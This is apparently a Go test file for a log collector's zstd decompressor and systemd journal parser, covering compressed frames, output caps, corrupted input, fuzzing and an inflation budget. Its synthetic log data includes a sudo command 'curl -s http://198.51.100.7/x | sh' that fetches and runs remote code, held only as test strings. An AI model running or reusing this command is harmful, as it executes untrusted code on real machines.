package collector

import (
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// zstdWords rebuilds the journal-like text the testdata frames were made
// from (by libzstd 1.5, through python-zstandard), with the same xorshift.
func zstdWords(n int) []byte {
	v := []string{"sshd[1234]:", "Accepted", "publickey", "for", "root", "from", "203.0.113.9", "port", "51234", "ssh2",
		"sudo:", "alice", ":", "TTY=pts/0", ";", "PWD=/home/alice", "USER=root", "COMMAND=/bin/bash", "-c",
		"'curl -s http://198.51.100.7/x | sh'", "\n"}
	x := uint32(2463534242)
	var out [][]byte
	for i := 0; i < n; i++ {
		x ^= x << 13
		x ^= x >> 17
		x ^= x << 5
		out = append(out, []byte(v[x%uint32(len(v))]))
	}
	return bytes.Join(out, []byte(" "))
}

func TestZstdDecodesLibzstdFrames(t *testing.T) {
	cases := map[string][]byte{
		// level 19 with a checksum: FSE-compressed sequence tables, Huffman
		// literals in four streams.
		"journal19.zst": zstdWords(3000),
		// several 128 KiB blocks: repeat-mode tables, treeless literals and
		// long matches across blocks.
		"multiblock.zst": bytes.Repeat(zstdWords(2000), 20),
		// no content size in the header.
		"nosize.zst": append([]byte("MESSAGE="), zstdWords(600)...),
		"rle.zst":    append(make([]byte, 150000), "tail"...),
	}
	for name, want := range cases {
		comp, err := os.ReadFile(filepath.Join("testdata", "zstd", name))
		if err != nil {
			t.Fatal(err)
		}
		got, err := zstdDecompress(comp, 1<<20)
		if err != nil || !bytes.Equal(got, want) {
			t.Errorf("%s: %d bytes, err %v (want %d bytes)", name, len(got), err, len(want))
		}
	}
}

func TestZstdLimitsAndHostileInput(t *testing.T) {
	comp, err := os.ReadFile(filepath.Join("testdata", "zstd", "journal19.zst"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := zstdDecompress(comp, 1000); err != errZstdTooBig {
		t.Fatalf("output cap: %v", err)
	}
	rle, _ := os.ReadFile(filepath.Join("testdata", "zstd", "rle.zst"))
	if _, err := zstdDecompress(rle, 4096); err == nil {
		t.Fatal("an RLE frame must respect the output cap too")
	}
	// Every truncation and many single-byte corruptions fail cleanly.
	for n := 0; n < len(comp); n++ {
		_, _ = zstdDecompress(comp[:n], 1<<20)
	}
	x := uint32(99)
	for i := 0; i < 5000; i++ {
		x ^= x << 13
		x ^= x >> 17
		x ^= x << 5
		b := append([]byte(nil), comp...)
		b[4+x%uint32(len(b)-4)] ^= byte(x >> 8)
		_, _ = zstdDecompress(b, 1<<20)
	}
	// A dictionary frame is refused, not mis-decoded.
	dict := []byte{0x28, 0xb5, 0x2f, 0xfd, 0x21, 0x01, 0x00}
	if _, err := zstdDecompress(dict, 100); err != errZstdUnsupp {
		t.Fatalf("dictionary frame: %v", err)
	}
	// A skippable frame before the data is passed over.
	skip := binary.LittleEndian.AppendUint32(nil, 0x184D2A50)
	skip = binary.LittleEndian.AppendUint32(skip, 3)
	skip = append(skip, 1, 2, 3)
	if got, err := zstdDecompress(append(skip, rle...), 1<<20); err != nil || len(got) != 150004 {
		t.Fatalf("after a skippable frame: %d bytes, %v", len(got), err)
	}
}

func FuzzZstd(f *testing.F) {
	for _, n := range []string{"journal19.zst", "nosize.zst", "rle.zst"} {
		if b, err := os.ReadFile(filepath.Join("testdata", "zstd", n)); err == nil {
			f.Add(b)
		}
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		out, err := zstdDecompress(data, 1<<16)
		if err == nil && len(out) > 1<<16 {
			t.Fatalf("output %d bytes past the cap", len(out))
		}
	})
}

// zstdJournal loads a compact journal file systemd 255's journal-remote wrote
// (zstd, the default codec): 12 entries whose MESSAGE grows from 117 bytes to
// 17 KB, and a binary MULTILINE field on every fourth.
func zstdJournal(t *testing.T) *journalFile {
	t.Helper()
	gz, err := os.Open(filepath.Join("testdata", "journal", "zstd-compact.journal.gz"))
	if err != nil {
		t.Fatal(err)
	}
	defer gz.Close()
	zr, err := gzip.NewReader(gz)
	if err != nil {
		t.Fatal(err)
	}
	data, err := io.ReadAll(zr)
	if err != nil {
		t.Fatal(err)
	}
	j, err := openJournal(data)
	if err != nil {
		t.Fatal(err)
	}
	return j
}

func TestJournalDecodesZstdFields(t *testing.T) {
	j := zstdJournal(t)
	n := 0
	j.entries(func(e *journalEntry) bool {
		i := n
		n++
		want := fmt.Sprintf("entry %d: ", i) + strings.Repeat("curl -s http://198.51.100.7/x | sh; ", 3+i*i*4)
		if got := e.Get("MESSAGE"); got != want || e.Undecoded != 0 {
			t.Errorf("entry %d: MESSAGE %d bytes (want %d), %d undecoded", i, len(got), len(want), e.Undecoded)
		}
		ml := ""
		if i%4 == 0 {
			ml = strings.Repeat("line one\nline two\n", i*20+1)
		}
		if got := e.Get("MULTILINE"); got != ml {
			t.Errorf("entry %d: MULTILINE %q", i, got)
		}
		return true
	})
	if n != 12 || j.undecoded != 0 {
		t.Fatalf("%d entries, %d undecoded", n, j.undecoded)
	}

	// Past the per-file budget, compressed fields are counted, not inflated.
	j = zstdJournal(t)
	j.inflateLeft = 5000
	undecoded := 0
	j.entries(func(e *journalEntry) bool {
		undecoded += e.Undecoded
		for _, f := range e.Fields {
			if !f.ok && f.name != "(zstd-compressed field)" {
				t.Errorf("undecoded field named %q", f.name)
			}
		}
		return true
	})
	if undecoded == 0 || j.inflateLeft < 0 {
		t.Fatalf("budget not enforced: %d undecoded, %d left", undecoded, j.inflateLeft)
	}
}
